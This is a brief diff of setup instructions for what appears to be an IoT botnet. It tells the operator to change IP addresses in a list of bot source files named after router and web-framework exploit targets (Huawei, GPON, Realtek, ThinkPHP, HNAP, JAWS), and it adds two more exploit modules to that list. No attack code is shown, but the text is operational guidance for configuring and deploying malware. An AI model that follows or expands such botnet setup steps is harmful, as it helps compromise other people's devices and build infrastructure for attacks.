@@ -67,7 +67,9 @@ mv cross-compiler-armv7l armv7l
  CHANGE IP(s) IN /bot/includes.h
  CHANGE IP(s) IN /bot/huawei.c
  CHANGE IP(s) IN /bot/gpon80_scanner.c
+ CHANGE IP(s) IN /bot/gpon443.c
  CHANGE IP(s) IN /bot/huawei.c
+ CHANGE IP(s) IN /bot/jaws.c
  CHANGE IP(s) IN /bot/realtek.c
  CHANGE IP(s) IN /bot/thinkphp.c
  CHANGE IP(s) IN /bot/hnap_scanner.c
